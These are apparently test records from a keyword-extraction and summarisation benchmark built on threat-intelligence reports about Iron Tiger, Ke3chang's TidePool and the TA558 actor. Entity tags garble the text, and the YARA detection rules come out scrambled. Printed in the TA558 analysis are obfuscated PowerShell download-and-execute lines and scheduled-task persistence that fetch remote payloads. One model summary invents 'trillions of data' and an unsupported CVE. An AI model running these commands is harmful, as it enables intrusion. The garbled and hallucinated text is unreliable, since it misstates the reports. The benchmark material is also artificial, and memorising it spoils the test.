IronTiger_HTTPBrowser_Dropperrule IronTiger_HTTPBrowser_Dropper { meta : author=\"Cyber [ORG] Safety [ORG] Solutions , [ORG] Trend [ORG] Micro\"Trend [ORG] Micro | Shadow Force Technical Briefstrings:$mz=\"MZ\"$str1=\".dllUT \" nocase wide ascii $ str2=\".exeUT \" nocase wide ascii $ str3=\".urlUT \" nocase wide asciicondition:$mz at [DATE] 0 and ( 2 of ( $ str*))}Rule [ORG] IronTiger_HTTP_SOCKS_Proxy_soexeauthor=\"Cyber [ORG] Safety [ORG] Solutions , Trend Micro\"$mz=\"MZ\"meta : strings : rule IronTiger_HTTP_SOCKS_Proxy_soexe } condition:$mz at [DATE] 0 and ( 3 of ( [MONEY] $ str*))$str1=\"listen [MONEY] SOCKET error . \" nocase wide ascii [MONEY] $ str2=\"WSAAsyncSelect [MONEY] SOCKET error . \" nocase wide ascii $ str3=\"new SOCKETINFO error ! \" nocase wide ascii $ [MONEY] str4=\"Http/1.1 [CARDINAL] 403 Forbidden \" nocase wide ascii [CARDINAL] $ str5=\"Create SOCKET error . \" nocase wide asciiRule IronTiger_NBDDos_Gh0stvariant_dropperrule IronTiger_NBDDos_Gh0stvariant_dropper strings:$mz=\"MZ\"author=\"Cyber [ORG] Safety [ORG] Solutions , [ORG] Trend [ORG] Micro\"Trend [ORG] Micro | Shadow Force Technical Brief$str1=\"This service ca n't be stoped . \" nocase wide ascii $ str2=\"Provides support for media palyer \" nocase wide ascii $ str4=\"CreaetProcess Error \" nocase wide ascii$bla1=\"Kill You \" nocase wide ascii $ [PERSON] bla2=\"%4.2f [PERSON] GB \" nocase wide asciicondition:$mz at 0 and ( ( any of ( $ str * ) ) or ( all of ( $ bla*)))}Rule IronTiger_PlugX_DosEmulatorauthor=\"Cyber [ORG] Safety [ORG] Solutions , Trend Micro\"$mz=\"MZ\"meta : strings : rule IronTiger_PlugX_DosEmulator } condition:$str1=\"Dos Emluator Ver \" nocase wide ascii $ [MONEY] str2=\"\\\\PIPE\\\\FASTDOS \" nocase wide ascii $ str3=\"FastDos.cpp \" nocase wide ascii $ str4=\"fail , error code = % d. \" nocase wide ascii$mz at 0 and ( any of ( $ str*))Rule IronTiger_PlugX_FastProxymeta : rule [ORG] IronTiger_PlugX_FastProxy { strings:$mz=\"MZ\"author=\"Cyber [ORG] Safety [ORG] Solutions , [ORG] Trend [ORG] Micro\"Trend [ORG] Micro | Shadow Force Technical Brief$str1=\"SAFEPROXY HTServerTimer Quit ! \" nocase wide ascii $ str2=\"Useage : % s pid \" nocase wide ascii $ [MONEY] str3=\"%s PORT[%d ] TO PORT[%d ] SUCCESS ! \" nocase wide ascii $ str4=\"p0 : port for listener \" nocase wide ascii $ str5=\"\\\\users\\\\whg\\\\desktop\\\\plug\\\\ \" nocase wide ascii $ str6=\"[+Y ] cwnd : % [CARDINAL] 3d , fligth : \" nocase wide asciicondition:$mz at 0 and ( any of ( $ str*))}Rule IronTiger_PlugX_Serverauthor=\"Cyber [ORG] Safety [ORG] Solutions , Trend Micro\"$str1=\"\\\\UnitFrmManagerKeyLog.pas \" nocase wide ascii $ str2=\"\\\\UnitFrmManagerRegister.pas \" nocase wide ascii $ str3=\"Input Name \" nocase wide ascii [MONEY] $ str4=\"New Value # \" nocase wide ascii $ [MONEY] str5=\"TThreadRControl . Execute SEH ! ! ! \" nocase wide ascii $ str6=\"\\\\UnitFrmRControl.pas \" nocase wide ascii $ str7=\"OnSocket(event is error ) ! \" nocase wide ascii $ str8=\"Make 3F Version Ok ! ! ! \" nocase wide ascii $ str9=\"PELEASE DO NOT CHANGE THE DOCAMENT \" nocase wide ascii $ str10=\"Press [ Ok ] Continue Run , Press [ Cancel ] Exit \" nocase wide ascii$mz=\"MZ\"meta : strings : rule IronTiger_PlugX_Server } condition:$mz at [DATE] 0 and ( 2 of ( $ str*))Rule IronTiger_ReadPWD86rule IronTiger_ReadPWD86 { [ORG] Trend [ORG] Micro | Shadow Force Technical Briefmeta : strings : author=\"Cyber [ORG] Safety [ORG] Solutions , Trend Micro\"$mz=\"MZ\"$str1=\"Fail To Load LSASRV \" nocase wide ascii $ str2=\"Fail To [ORG] Search [ORG] LSASS [ORG] Data \" nocase wide ascii $ str3=\"User Principal \" nocase wide asciicondition:$mz at 0 and ( all of ( $ str*))}Rule IronTiger_Ring_Gh0stvariantauthor=\"Cyber [ORG] Safety [ORG] Solutions , Trend Micro\"$mz=\"MZ\"$str1=\"RING RAT Exception \" nocase wide ascii $ str2=\"(can not update server recently ) ! \" nocase wide ascii $ str4=\"CreaetProcess Error \" nocase wide ascii$bla1=\"Sucess ! \" nocase wide ascii $ bla2=\"user canceled ! \" nocase wide asciimeta : strings : rule IronTiger_Ring_Gh0stvariant } condition : Rule IronTiger_wmiexecrule IronTiger_wmiexec { meta:$mz at 0 and ( ( any of ( $ str * ) ) or ( all of ( $ bla*)))Trend Micro | Shadow Force Technical Briefauthor=\"Cyber Safety Solutions , Trend Micro \" comment=\"wmi.vbs detection\"strings:$str1=\"Temp [PERSON] Result [PERSON] File , Change it to where you like \" nocase wide ascii $ str2=\"wmiexec \" nocase wide ascii $ str3=\"By . Twi1ight \" nocase wide ascii $ str4=\"[both mode ] , delay TIME to read result \" nocase wide ascii $ str5=\"such as [NORP] nc.exe or Trojan \" nocase wide ascii [MONEY] $ str6=\"+++shell [MONEY] mode+++ \" nocase wide ascii $ str7=\"win2008 fso has no privilege to delete file \" nocase wide asciicondition:2 of ( $ str*)}Trend [ORG] Micro [ORG] Incorporated , a global leader in security software , strives to make the world safe for exchanging digital information . Our innovative solutions for consumers , businesses and governments provide layered content security to protect information on mobile devices , endpoints , gateways , servers and the cloud . All of our solutions are powered by cloud - based global threat intelligence , the Trend Micro \u2122 Smart Protection Network \u2122 , and are supported by [CARDINAL] over [CARDINAL] 1,200 threat experts around the globe . For more information , visit www.trendmicro.com.t - balllogo are \u00a9 [DATE] 2015 by [ORG] Trend [ORG] Micro , Incorporated . All rights reserved . [ORG] Trend [ORG] Micro and the [ORG] Trend [ORG] Micro trademarks of [ORG] Trend [ORG] Micro , Incorporated . All other product or company names may be trademarks or registered trademarks of their owners.trademarks or [PERSON] registered10101 [PERSON] N. [PERSON] De [PERSON] Anza [PERSON] Blvd . [GPE] Cupertino , CA [CARDINAL] 95014U.S. toll free : 1 +800.228.5651 Phone : [CARDINAL] 1 +408.257.1500 Fax : [QUANTITY] 1 [QUANTITY] +408.257.2003", "generated_text": "Operation Iron Tiger; defense contractors; the US; stolen emails; intellectual property; strategic planning documents; data; the threat actors; this appendix; indicators; compromise; detection rules; malware; Hashes; Detections; the malware; Other fraudsters; CVE-2018-11979; YARA Rules.", "ref_text": "<START-1>The document is an appendix providing additional technical details related to the Operation Iron Tiger cyberespionage campaign. It contains indicators of compromise like malware hashes, domains, IP addresses, and YARA rules that can be used to detect the tools used in the attacks. The appendix lists out hashes of the various custom and public tools used in Operation Iron Tiger along with their Trend Micro detections. It provides a list of fraudulent domains and IPs related to the campaign's infrastructure. The document also includes YARA rules that security researchers and defenders can use to identify malware samples associated with Operation Iron Tiger. The rules look for unique strings and metadata in the malware binaries and scripts. In summary, this appendix complements the Operation Iron Tiger research paper by providing technical threat intelligence like IOCs and detection rules. It aims to help network defenders and researchers identify threats related to this cyberespionage campaign targeting US defense contractors. The details can enable organizations to detect potential compromises by the Iron Tiger actors. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4375, "gpt3/lexical/rouge_rouge2": 0.1678321678321678, "gpt3/lexical/rouge_rougeL": 0.2361111111111111, "gpt3/lexical/rouge_rougeLsum": 0.2361111111111111, "gpt3_generated_text": ["Operation Iron Tiger is a targeted cyber-espionage attack on US defense contractors, involving the theft of trillions of data, including stolen emails, intellectual property, and strategic planning documents. This appendix provides indicators of compromise and detection rules for the malware used by the threat actors, including malware hashes and detections. The document also includes YARA rules for detecting specific malware, such as ASPXSpy and ChangePort Toolkit drivers. The threat actors behind Operation Iron Tiger have utilized fraudulent domains and IP addresses to carry out their attacks, targeting vulnerable systems and exploiting vulnerabilities such as CVE-2018-11979. This appendix serves as a valuable resource for organizations seeking to enhance their cybersecurity defenses against similar cyber threats."]}, {"split_name": "test", "sample_id": "test_127", "prompt_text": "Extract the keywords: 8POSTED BY : [PERSON] Micah [PERSON] Yates , [PERSON] Mike [PERSON] Scott , [PERSON] Brandon [PERSON] Levene , [PERSON] Jen Miller - Osborn and [PERSON] Tom [PERSON] Keigher on [DATE] May 22 , [DATE] 2016 6:00 PMFILED IN : [PERSON] Malware , Unit 42 TAGGED : [ORG] AutoFocus , [ORG] BS2005 , CVE-2015 - 2545 , [PERSON] Ke3chang , [PERSON] Operation [PERSON] Ke3chang , [GPE] TidePoolLittle has been published on the threat actors responsible for Operation Ke3chang since the report was released [DATE] more [DATE] than [DATE] two [DATE] years [DATE] ago . However , Unit 42 has recently discovered the actors have continued to evolve their custom malware arsenal . We \u2019ve discovered a new malware family we \u2019ve named TidePool . It has strong behavioral ties to [ORG] Ke3chang and is being used in an ongoing attack campaign against [NORP] Indian embassy personnel worldwide . This targeting is also consistent with previous attacker TTPs ; [PERSON] Ke3chang historically targeted [ORG] the [ORG] Ministry [ORG] of [ORG] Affairs , and also conducted several prior campaigns against [GPE] India . Though we do n\u2019t have comprehensive targeting information , the spear phishing emails we found targeted several [NORP] Indian embassies in different countries . [CARDINAL] One decoy references an [DATE] annual report filed by over [CARDINAL] 30 [NORP] Indian embassies across the globe . The sender addresses of the phishing emails spoof real people with ties to [NORP] Indian embassies , adding legitimacy to the emails to prompt the recipients to open the attached file . Also noteworthy , the actors are exploiting a relatively new vulnerability in their attacks with [ORG] TidePool , which is detailed below . In this report we will highlight the reuse of the code responsible for a variety of registry changes and command and control traffic over time as the [ORG] Ke3chang actor has evolved their codebase to [ORG] TidePool since the [DATE] 2013 report . The weaponized document sent in phishing emails triggers the vulnerability outlined in [DATE] CVE- [DATE] 2015 - 2545 , which was [ORDINAL] first made public in [DATE] September [DATE] 2015 . Unlike previously seen exploit carrier docs , this version comes packaged as an MHTML document which by default opens in Microsoft Word . We have seen multiple waves of activity with similar exploit docs , including those referenced in our recent Spivy blog . PwC recently released a great report analyzing the exploit documents themselves . The samples we are covering are documented in the \u201c Windows User_A \u201d section of their report ( the malware they refer to as \u201c [WORK_OF_ART] Danti [WORK_OF_ART] Downloader\u201d).TidePool contains many capabilities common to most RATs . It allows the attacker to read , write and delete files and folders , and run commands over named pipes . TidePool gathers information about the victim \u2019s computer , base64 encodes the data , and sends it to the [ORG] Command and Control ( C2 ) server via HTTP , which matches capabilities of the [PRODUCT] BS2005 malware family used by the [ORG] Ke3chang actorThe [PRODUCT] TidePool malware is housed in an MHTML document which exploits CVE-2015 - 2545 . The exploit code drops a [ORG] DLL intoC:\\Documents and Settings\\AllUsers\\IEHelper\\mshtml.dllThis dropped [ORG] DLL is the [PRODUCT] TidePool sample . It also launches Internet Explorer as a subprocess of the svchost service . For persistence , [ORG] TidePool utilizes an [PRODUCT] ActiveSetup key , which will launch itself on boot with the following parameters : rundll32.exe C:\\DOCUME~1\\ALLUSE~1\\IEHelper\\mshtml.dll,,IEHelperThe TidePool sample then sends victim computer information to the [CARDINAL] C2 server , as shown in Figure [CARDINAL] 1 . Once a connection is made , the sample behaves as a [ORG] RAT , receiving commands from the C2.Get Updates Sign up to receive the latest news , cyber threat intelligence and research from Unit 42.Business EmailSubmitSelect a CategorySelect a MonthMORE \u2192Rick Howard Enters a Lion \u2019s [ORG] Den [ORG] of [ORG] Journalists posted by [PERSON] Rick [PERSON] Howard on [DATE] May 24 , [DATE] 2016 [PERSON] William [PERSON] Saito : [ORG] The G7 \u2019s [ORG] Opportunity [ORG] To [ORG] Push [ORG] Cybersecurity As A Business Enabler posted by [PERSON] Chad [PERSON] Berndtson on [DATE] May 23 , [DATE] 2016 [DATE] Operation Ke3chang Resurfaces With New TidePool Malware posted by Micah Yates on [DATE] May 22 , [DATE] 2016 [ORG] Palo [ORG] Alto [ORG] Networks [ORG] News [ORG] of the Week \u2013 [DATE] May [DATE] 21 posted by [PERSON] Anna [PERSON] Lough on [DATE] May [DATE] 21 , [DATE] 2016 People of Palo Alto Networks : [PERSON] Chuck [PERSON] Konrad posted by [PERSON] Justin [PERSON] Hall on [DATE] May [DATE] 20 , [CARDINAL] 2016MORE \u21921 16POST url [PRODUCT] HTTP/1.1 [PRODUCT] Accept : image / gif , image / x - xbitmap , image / jpeg , image / pjpeg , application [PERSON] Accept - Language : en - us Content - Type : multipart / form - data ; boundary=----=_Part_4e67c6a7 Accept - Encoding : gzip , deflate User - Agent : [PERSON] Mozilla/4.0 ( compatible ; [ORG] MSIE [CARDINAL] 6.0 ; Windows NT [CARDINAL] 5.1 ; SV1 ; Host : goback.strangled.net Content - Length : [CARDINAL] 602 Proxy - Connection : Keep - Alive Pragma : no - cache Content - Disposition : form - data ; name=\"m1.jpg \" Content - Type : application / octet - steam WAQAAEYBAABGAQAARgEAAAAAAAAAAAAAhv0OeukKAAAVAAAAHAEAAAUAAAABAAAAKAoAAAIAAABTAGUAcgB2AGkAYwBlACAAUABhAGMAawAgADMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAABAQACAAAAUkUJAAAAV0lOWFBSRVY1tQFpc3UFACkALAEAFigure [CARDINAL] 1 . The [PERSON] Base64 encoded data contains information about the victim \u2019s service pack level , the current user , and the [ORG] NETBIOS name of the victim system . During our initial triage of the [PRODUCT] TidePool samples in [ORG] AutoFocus , we noticed Windows Registry modifications that by themselves were not unique , but when viewed together were used by multiple malware families . [CARDINAL] One of these families is the \u201c BS2005 \u201d malware family used by the [ORG] Ke3chang actor . This motivated us to dig deeper , since we had not seen any public reporting on them since [DATE] 2013 . From this analysis , Unit 42 compared the code bases of the new malware family , and the [PRODUCT] BS2005 malware samples . Based on our analysis we believe this new malware , which we are calling [PRODUCT] TidePool , is an evolution of the [PRODUCT] BS2005 malware family used by the [ORG] Ke3chang actor . Unit [CARDINAL] 42 has discovered [CARDINAL] 11 similar registry modifications that both [PERSON] TidePool and [PRODUCT] BS2005 employ . The registry setting that [PRODUCT] TidePool and [PRODUCT] BS2005 focuses on is : Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IEHarden - > 0When [ORG] the [ORG] IEHarden [ORG] Value is set to [CARDINAL] 0 it disables [ORG] the [ORG] Internet [ORG] Explorer [ORG] Enhanced [ORG] Security configuration , which is designed to prevent the execution of scripts , ActiveX [PERSON] Controls , file downloads , and the [ORG] Microsoft virtual machine for [ORG] HTML content . This is a technique common to both [PRODUCT] BS2005 and [PRODUCT] TidePool malware . Below is the routine within [ORG] TidePool that modifies the [ORG] IEHarden registry settings . The repetition , order , and uniqueness of the code base in this function allowed us to link [ORG] TidePool back to older versions of [PRODUCT] BS2005 and [PERSON] Operation [PERSON] Ke3chang . Figure [CARDINAL] 2 . Routine to modify the [ORG] IEHarden [ORG] Value linking TidePool to BS2005.Code reuse overlap also allowed us to link the various interim malware iterations between [ORG] Ke3chang and [PRODUCT] TidePool together . Going over every single code overlap would be tiresome , so we \u2019ll highlight major functional similarities that allowed us to link [ORG] TidePool to [PERSON] Operation [PERSON] Ke3chang . A listing of similar hashes and their compile dates can be found in the [ORG] IOC section at the end of this blog . They are also divided into those that pre - date the [EVENT] Operation [EVENT] Ke3chang report and those that came after . We compared [CARDINAL] 5 key samples that link TidePool to the original [PERSON] Operation [PERSON] Ke3chang malware . In code routine to obfuscate the C2 . Further analysis shows that they also share similar [PERSON] Base64 string handling . This routine goes back even further to [ORG] MyWeb malware samples , also associated with [PERSON] Operation [PERSON] Ke3chang . Next we compared the codebase for setting registry keys . The code reuse displayed in Figure [CARDINAL] 4 is the sequence that sets the [ORG] IEHarden registry keys and other keys used throughout [ORG] TidePool and [PERSON] Operation [PERSON] Ke3chang samples . The code that handles URL beacon creation is shown in Figure [CARDINAL] 5 . These functions also both modify the [ORG] IEHarden registry key , as well as the following list of keys . Setting these registry keys is unique to the [ORG] Ke3chang and [PRODUCT] TidePool malware families . HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Check_AssociationsHKCU\\Software\\Microsoft\\Internet Explorer\\Main\\DisableFirstRunCustomizeHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IEhardenAttribution is an inexact process , however we have compiled several interesting findings which lend themselves to our conclusion that this activity and malware is related to the original [PERSON] Operation [PERSON] Ke3chang . Strong behavioral overlap between the [PRODUCT] TidePool malware family and malware called [PRODUCT] BS2005 utilized by Operation Ke3changStrong code reuse and overlap showing a branching and evolution of malware from BS2005 to [ORG] TidePool . Targeting and attack method matches historic [ORG] Ke3chang targeting . When binaries included resources , encoding was [PERSON] 0x04 ( LANG_CHINESE ) indicating the actor \u2019s system is likely running an operating system and software with [NORP] Chinese as the default display language . Despite going unreported on since [DATE] 2013 , [PERSON] Operation [PERSON] Ke3chang has not ceased operations and in fact continued developing its malware . Unit [CARDINAL] 42 was able to track the evolution of Operation Ke3chang \u2019s tools by observing unique behavioral quirks common throughout the malware \u2019s lineage . By pivoting on these behaviors in [ORG] AutoFocus , we were able to assess a relationship between these families dating back to at least 2012 and the creation of [ORG] TidePool , a new malware family continuing in [GPE] Ke3chang \u2019s custom malware footsteps . While we ca n\u2019t know all of the groups \u2019 attacks using [ORG] TidePool or older malware , we have uncovered its use against [ORG] Indian [ORG] Embassies , which was also documented in the [DATE] 2013 report , indicating this is likely a high priority target as it has continued over multiple years . Customers can utilize the Ke3changResurfaces [ORG] AutoFocus tag to examine the samples", "generated_text": "the document; Operation Ke3chang; Indian embassy personnel; The malware has strong behavioral ties; Ke3chang; 2016; spear phishing emails; the vulnerability; CVE-2015-2545; the exploit code; a DLL; a subprocess; command; control; the C2 server; HTTP; persistence; the DLL; IOCs; the BS2005 malware; the RAT; commands; a RAT; the C2 server; activity; the NAT; the RAT; the C2 server; a command; summary; the actors; the report; Operation Ke3chang; ties; the report.", "ref_text": "<START-1>The report describes a cyberespionage operation called Operation Ke3chang conducted by a China-based threat actor group. Researchers discovered the group has evolved its malware arsenal and is using a new backdoor family called TidePool. The TidePool malware was used in attacks against Indian embassy personnel worldwide. The attacks involved weaponized documents exploiting the CVE-2015-2545 vulnerability. Analysis uncovered similarities between TidePool and the BS2005 malware used previously by the Ke3chang group. The malware functionality includes gathering system info, reading/writing files, running commands, and exfiltrating data. The group continues to target organizations in sectors like government, technology, and telecommunications for espionage purposes. Research traced the malware evolution from samples before and after the 2013 Ke3chang report. Code reuse, registry modifications, C2 traffic, targeting, etc. provided evidence linking TidePool to the BS2005 malware. The ongoing attacks show Ke3chang remains active despite lack of public reporting. In summary, the threat actor group behind the Operation Ke3chang cyberespionage campaign evolved its tools over time but continues similar targeting. The new TidePool backdoor has ties to their previous BS2005 malware based on code reuse and behaviors. The group remains a threat with its compromise of Indian embassies using updated malware. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.45161290322580644, "gpt3/lexical/rouge_rouge2": 0.1592920353982301, "gpt3/lexical/rouge_rougeL": 0.2346041055718475, "gpt3/lexical/rouge_rougeLsum": 0.2346041055718475, "gpt3_generated_text": ["The article discusses the recent discovery of a new malware family called TidePool, which is believed to be related to Operation Ke3chang. This malware is being used in an ongoing attack campaign against Indian embassy personnel worldwide. The spear phishing emails used in the attacks target several Indian embassies and spoof real people with ties to these embassies to add legitimacy to the emails. The malware exploits a vulnerability in Microsoft Word, detailed in CVE-2015-2545, and is able to read, write, and delete files and folders, as well as run commands over named pipes. The malware sends victim computer information to a command and control (C2) server and behaves as a remote access trojan (RAT) once a connection is made. The article also mentions that the Ke3chang actor has continued to evolve their codebase since the 2013 report on Operation Ke3chang."]}, {"split_name": "test", "sample_id": "test_128", "prompt_text": "Extract the keywords: www.proofpoint.com /us / blog / threat - insight / reservations - requested - ta558 - targets - hospitality - and - travel [ORG] Reservations Requested : TA558 Targets [ORG] Hospitality [ORG] and [ORG] Travel \u22ee [CARDINAL] 8/16/2022Key Findings : [PRODUCT] TA558 is a likely financially motivated small crime threat actor targeting hospitality , hotel , and travel organizations . Since [DATE] 2018 , this group has used consistent tactics , techniques , and procedures to attempt to install a variety of malware including [PERSON] Loda [PERSON] RAT , [ORG] Vjw0rm , and Revenge RAT.1/11TA558 \u2019s targeting focus is mainly on [NORP] Portuguese and [NORP] Spanish speakers , typically located in the [LOC] Latin [LOC] America region , with additional targeting observed in [LOC] Western [LOC] Europe and [LOC] North [LOC] America . TA558 increased operational tempo in [DATE] 2022 to a higher average than previously observed . Like other threat actors in [DATE] 2022 , [ORDINAL] TA558 pivoted away from using macro - enabled documents in campaigns and adopted new tactics , techniques , and procedures . OverviewSince 2018 , [GPE] Proofpoint has tracked a financially - motivated cybercrime actor , [PRODUCT] TA558 , targeting hospitality , travel , and related industries located in [LOC] Latin [LOC] America and sometimes [LOC] North [LOC] America , and western [LOC] Europe . The actor sends malicious emails written in [LANGUAGE] Portuguese , [NORP] Spanish , and sometimes [LANGUAGE] English . The emails use reservation - themed lures with business - relevant themes such as hotel room bookings . The emails may contain malicious attachments or URLs aiming to distribute one of [CARDINAL] at [CARDINAL] least [CARDINAL] 15 different malware payloads , typically remote access trojans ( RATs ) , that can enable reconnaissance , data theft , and distribution of follow - on payloads . [GPE] Proofpoint tracked this actor based on a variety of email artifacts , delivery and installation techniques , command and control ( C2 ) infrastructure , payload domains , and other infrastructure . In [DATE] 2022 , [GPE] Proofpoint observed an increase in activity compared to [DATE] previous [DATE] years . Additionally , TA558 shifted tactics and began using URLs and container files to distribute malware , likely in response to [ORG] Microsoft announcing it would begin blocking [ORG] VBA macros downloaded from the internet by default . TA558 has some overlap with activity reported by [ORG] Palo [ORG] Alto [ORG] Networks in [DATE] 2018 , [PERSON] Cisco [PERSON] Talos in [DATE] 2020 and [DATE] 2021 , [GPE] Uptycs in [DATE] 2020 , and [ORG] HP in [DATE] 2022 . This report is the [ORDINAL] first comprehensive , public report on TA558 , detailing activity conducted [DATE] over [DATE] four [DATE] years that is still ongoing . The information used in the creation of this report is based on email campaigns , which are manually contextualized , and analyst enriched descriptions of automatically condemned threats . Campaign Details and Activity Timeline2018Proofpoint [ORDINAL] first observed TA558 in [DATE] April [DATE] 2018 . These early campaigns typically used malicious [PERSON] Word attachments that exploited [ORG] Equation Editor vulnerabilities ( e.g. CVE-2017 - 11882 ) or remote template URLs to download and install malware . [CARDINAL] Two of the most common malware payloads included [ORG] Loda [ORG] and [ORG] Revenge [ORG] RAT . Campaigns were conducted exclusively in [LANGUAGE] Spanish and [NORP] Portuguese and targeted the hospitality and related industries , with \u201c reserva \u201d ( [NORP] Portuguese and installed [ORG] Revenge RAT . Interestingly , the term \u201c [WORK_OF_ART] CDT \" is in the document metadata and in the URL . This term , which may refer to a travel organization , appears throughout TA558 campaigns from [DATE] 2018 to present . RTF payload URL example : hxxp[://]cdtmaster[.]com[.]br / DadosDaReserva[.]doc2019In [DATE] 2019 , this actor continued to leverage emails with Word documents that exploited [ORG] Equation Editor vulnerabilities ( e.g. CVE-2017 - 11882 ) to download and install malware . TA558 also began using macro - laden [ORG] PowerPoint attachments and template injection with Office documents . This group expanded their malware arsenal to include [ORG] Loda , [ORG] vjw0rm , Revenge RAT , and others . In [DATE] 2019 , the group began occasionally expanding targeting outside of the document ( Author : obidah qudah , Operator : [PERSON] Richard ) exploited the [ORG] CVE-2017 - [DATE] 11882 vulnerability to retrieve and execute an MSI file . Upon execution , the MSI file extracted and ran [PERSON] Loda malware . In [DATE] December [DATE] 2019 , [GPE] Proofpoint analysts observed TA558 begin to send [LANGUAGE] English - language lures relating to room bookings in addition to [NORP] Portuguese and Spanish.2020In 2020 , [PRODUCT] TA558 stopped using [ORG] Equation Editor exploits and began distributing malicious [ORG] Office documents with macros , typically [ORG] VBA macros , to download and install malware . This group continued to use a variety of malware payloads including the addition of njRAT and Ozone RAT.Hotel , hospitality , and travel organization targeting continued . Although the actor slightly increased its English- language operational tempo throughout [DATE] 2020 , most of the lures featured [NORP] Portuguese and [NORP] Spanish reservation enabled , executed a [ORG] PowerShell script to download a VBS payload from an actor - controlled domain . The VBS script in turn downloaded and executed [ORG] Revenge [DATE] RAT.Figure [DATE] 5 : [DATE] 2020 attack path exampleTA558 was more active in [DATE] 2020 [DATE] than [DATE] previous [DATE] years [DATE] and [DATE] 2021 , with [CARDINAL] 74 campaigns identified . [DATE] 2018 , [DATE] 2019 , and [DATE] 2021 had [CARDINAL] 9 , [DATE] 70 , and [CARDINAL] 18 total campaigns , respectively . So far in [DATE] 2022 , [GPE] Proofpoint analysts have observed [CARDINAL] 51 TA558 campaigns . Figure [CARDINAL] 6 : Total number of TA558 campaigns over [DATE] time2021In [DATE] 2021 , this actor continued to leverage emails with [ORG] Office documents containing macros or Office exploits ( e.g. CVE-2017 - 8570 ) to download and install malware . Its most consistently used malware payloads included vjw0rm , njRAT , Revenge RAT , [PERSON] Loda , and AsyncRAT.5/11Additionally , this group started to include more elaborate attack chains in [DATE] 2021 . For example , introducing more helper messages contained [ORG] Microsoft [ORG] Word attachments with macros which , if enabled , invoked a series of scripts to ultimately download and execute AsyncRAT.Figure [CARDINAL] 7 : Example TA558 email from [CARDINAL] 2021Of note is the repeat use of the string \u201c CDT \u201d contained the replyto email address and C2 domain names . AsyncRAT C2 domains : warzonecdt[.]duckdns[.]orgcdt2021.zapto[.]orgExample PowerShell execution to download and execute AsyncRAT:$NOTHING = ' ( Ne<^^>t . We' . Replace('<^^>','w [PERSON] - ObjectNe');$alosh='bC||||||!@!@nlo' . Replace('||||||!@!@','lient).Dow ' ) ; $ Dont='adString(''hxxps[:]//brasilnativopousada[.]com[.]br / Final.txt'')';$YOUTUBE = [ORG] IEX ( $ [PERSON] NOTHING,$alosh,$Dont -Join '' ) |IEXPersistence was achieved through a scheduled task masquerading as a [ORG] Spotify service . schtasks /create /sc MINUTE /mo [CARDINAL] 1 [CARDINAL] 0 /tn \" Spotfy \" /tr \" \\\"%windir%\\system32\\mshta.exe\\\"hxxps[:]//www[.]unimed- corporated[.]com / microsoft.txt \" /FThis was the actor \u2019s least active year . Proofpoint observed [CARDINAL] just [CARDINAL] 18 campaigns conducted by [PRODUCT] TA558 in [DATE] 2021.2022In [DATE] 2022 , campaign tempo increased significantly . Campaigns delivered a mixture of malware such as , Loda , Revenge RAT , and AsyncRAT . This actor used a variety of delivery mechanisms including URLs , [ORG] RAR attachments , [ORG] ISO attachments , and [ORG] Office documents . TA558 followed the trend of many threat actors in [DATE] 2022 and began using container files such as [ORG] RAR and [ORG] ISO attachments instead of macro - enabled [ORG] Office documents . This is likely due to [ORG] Microsoft \u2019s announcements in [DATE] late [DATE] 20216/11and [DATE] early [DATE] 2022 about disabling macros by default in [ORG] Office products , which caused a shift across the threat landscape of actors adopting new filetypes to deliver payloads . Additionally , [ORG] TA558 began using URLs more frequently in [DATE] 2022 . TA558 conducted [CARDINAL] 27 campaigns with URLs in [DATE] 2022 , compared to [CARDINAL] just [CARDINAL] five campaigns total from [DATE] 2018 through [DATE] 2021 . Typically , URLs led to container files such as ISOs or zip files containing executables . Figure [CARDINAL] 8 : Campaigns using specific threat types over timeFor example , this [DATE] 2022 [LANGUAGE] Spanish language campaign featured URLs leading to container files . Messages purported to be , e.g.:From : [PERSON] Mauricio [PERSON] Fortunato < contato@155hotel[.]com[.]br > Subject : Enc : Reserva FamiliarThe URL purported to be a legitimate [CARDINAL] 155 Hotel reservation link that led to an [ORG] ISO file and an embedded batch file . The execution of the [ORG] BAT file led to a [ORG] PowerShell helper script that downloaded a follow - on payload , AsyncRAT.Similar to earlier campaigns , persistence was achieved via a scheduled task : schtasks /create /sc MINUTE /mo [CARDINAL] 1 /tn Turismo /F /tr \" powershell -w h -NoProfile -ExecutionPolicy [ORG] Bypass [ORG] - [ORG] Command start - sleep -s 20;iwr \" \" \\\"\"hxxps[:]//unimed- corporated[.]com / tur / turismo[.]jpg\"\"\\ \" \" -useB|iex;\"Figure [CARDINAL] 9 : [DATE] 2022 campaign example chain . In [DATE] April [DATE] 2022 Proofpoint researchers spotted a divergence from the typical email lure . [CARDINAL] One of the campaigns included a [ORG] QuickBooks invoice email lure . Additionally , this campaign included the distribution of RevengeRAT which had not The execution of helper scripts ultimately led to the installation of RevengeRAT . Proofpoint has not seen this theme since [DATE] April , and it is unclear why TA558 temporarily pivoted away from reservations themes . [PERSON] Malware [PERSON] UseSince [PERSON] 2018 , TA558 has used [CARDINAL] at [CARDINAL] least [CARDINAL] 15 different malware families , sometimes with overlapping command and control ( C2 ) domains . The most frequently observed payloads include [ORG] Loda , [ORG] Vjw0rm , AsyncRAT , and [ORG] Revenge RAT.Figure 10 : Number of TA558 campaigns by malware type over timeTypically , TA558 uses attacker owned and operated infrastructure . However , [GPE] Proofpoint has observed TA558 leverage compromised hotel websites to host malware payloads , thus adding legitimacy to its malware delivery and [CARDINAL] C2 traffic . [ORG] Language [ORG] UseSince [ORG] Proofpoint began tracking TA558 through [DATE] 2022 , over 90 % of campaigns were conducted in [LANGUAGE] Portuguese or [LANGUAGE] Spanish , with 